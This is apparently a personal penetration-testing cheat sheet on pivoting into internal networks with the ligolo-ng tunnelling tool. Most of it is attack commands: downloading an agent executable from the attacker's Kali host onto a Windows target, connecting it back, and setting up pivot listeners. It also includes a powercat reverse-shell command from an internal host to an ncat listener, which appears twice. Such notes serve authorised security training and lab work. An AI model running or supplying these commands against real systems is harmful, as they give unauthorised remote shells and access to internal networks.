# ligolo-ng
- Very quick walkthrough : https://www.youtube.com/watch?v=txFnX5NPqKc
```bash
proxy -selfcert		# KALI :  start ligolo-ng
curl.exe http://KALIip/ligolo_agent.exe -o agent.exe        # WIN : copy agent to windows target
./agent.exe -connect KALIip:11601 -ignore-cert # WIN : agent connects back to KALI 

# linogo-ng interface on KALI
session 
autoroute
select subnet/route you want access to
create a new interface, start tunnel

##### CLeanup if problems ##################
iflist
ifdel --name name_of_int
```
## Testing
- Attempt to useu the remote subnet through linolo-ng as normal
- Remember, NMAP will require 3 way connect, -sT, not syn stealth
-  John Hammond https://www.youtube.com/watch?v=qou7shRlX_s
``` bash
nmap -Pn -sn 10.1.2.0/24
```

## Setup listeners on the PIVOT machine
```bash
# Terminal running ligolo-ng 
session, choose Pivot Machine session, enter
listener_add -addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

# KALI terminal 
rlwrap ncat -nvlp 10000

# On internal_host1
powercat -c 10.1.2.4 -p 30000 -ep
```
##  Access Local Pivot ports
```bash
sudo ip r a 240.0.0.1/32 dev ligolo 
nmap 240.0.0.1      # TEST
```

Now we have the following, 
KALI -> PIVOT -> Inernal_Host1
If we want host1 to RevShell to Kali, we can use pivot
Setup listeners on the PIVOT machine

```bash
# Terminal running ligolo-ng 
session, choose Pivot Machine session, enter
listener_add -addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

# KALI terminal 
rlwrap ncat -nvlp 10000

# On internal_host1
powercat -c 10.1.2.4 -p 30000 -ep

### If you need to access local ports of pivot machine from KALI
sudo ip r a 240.0.0.1/32 dev ligolo
nmap 240.0.0.1 ## testing
```

## Install & Setup
- Install from here : https://github.com/nicocha30/ligolo-ng
- Download, and place in /opt/ligolo-ng
- Download Proxy for KALI and Agent for WINDOWS targets

```bash
mkdir /opt/ligolo-ng
tar xvfz ligolo.tar.gz
sudo chmod +x ./proxy 

#The Ligolo-ng proxy needs to create and manage the tun network interface (tun0 or ligolo)
# use setcap to delegate perm, so you can run ./proxy as non-ROOT user
# Grant the capability to administer network interfaces (NET_ADMIN)
sudo setcap cap_net_admin+eip ./proxy
# verify the cap is working
getcap ./proxy  # output should confirm the capability (e.g., ./proxy_linux_amd64 = cap_net_admin+eip).
./proxy -selfcert # Run the proxy without using sudo

# update $PATH in  ~/.zshrc
export PATH=$PATH:/opt/ligolo-ng
```


